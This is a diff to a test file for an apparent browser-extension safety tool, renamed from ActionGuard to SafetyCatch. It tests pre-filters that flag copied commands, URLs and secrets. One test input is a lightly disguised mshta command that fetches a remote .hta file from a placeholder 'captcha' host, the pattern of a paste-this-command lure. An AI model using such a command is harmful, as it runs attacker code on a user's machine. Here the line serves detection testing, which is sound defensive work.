@@ -1,4 +1,4 @@
-// Copyright 2026 The ActionGuard Authors
+// Copyright 2026 The SafetyCatch Authors
 // SPDX-License-Identifier: Apache-2.0
 //
 // The pre-filters decide whether a content script asks the service worker at
@@ -8,9 +8,7 @@
 
 import assert from 'node:assert/strict';
 import { test } from 'node:test';
-import { analyzeAuthFlow, analyzeCommand, analyzeUrl, scanSecrets } from 'actionguard-engine';
-import { DEVICE_CODE_ENDPOINTS, OAUTH_ENDPOINTS } from '../node_modules/actionguard-engine/dist/rules/auth.js';
-import { PLATFORMS } from '../node_modules/actionguard-engine/dist/rules/platforms.js';
+import { analyzeAuthFlow, analyzeCommand, analyzeUrl, DEVICE_CODE_ENDPOINTS, OAUTH_ENDPOINTS, PLATFORMS, scanSecrets } from 'safetycatch-engine';
 import { isPlatformHint } from '../src/shared/platform-hints.ts';
 import { hasDownloadStep, hasInstructionHint, isAuthUrlCandidate, looksRunnable, mightHoldSecret, needsCommandCheck } from '../src/shared/prefilter.ts';
 import { formatSitePattern, hostOf, isHttpUrl, matchesSite, originPath, parseSitePattern } from '../src/shared/sites.ts';
@@ -21,7 +19,7 @@ const ch = (cp: number): string => String.fromCodePoint(cp);
 
 test('command pre-filter: ordinary copies never reach the engine', () => {
   for (const benign of [
-    'Hello from the ActionGuard test page.',
+    'Hello from the SafetyCatch test page.',
     'Meeting notes: call Sam at 3pm about the budget.',
     'https://example.com/some/page?x=1&y=2',
     'short',
@@ -76,7 +74,7 @@ test('looksRunnable: only fetch-or-hide command shapes (used when the engine is 
   assert.equal(looksRunnable(arm('msh¦ta https://verify.example.test/captcha.hta')), true);
   assert.equal(looksRunnable('npm install express'), false);
   assert.equal(looksRunnable('git clone https://github.com/example/repo.git'), false);
-  assert.equal(looksRunnable('Hello from the ActionGuard test page.'), false);
+  assert.equal(looksRunnable('Hello from the SafetyCatch test page.'), false);
   assert.equal(looksRunnable('ls -la'), false);
   assert.equal(looksRunnable(undefined), false);
 });
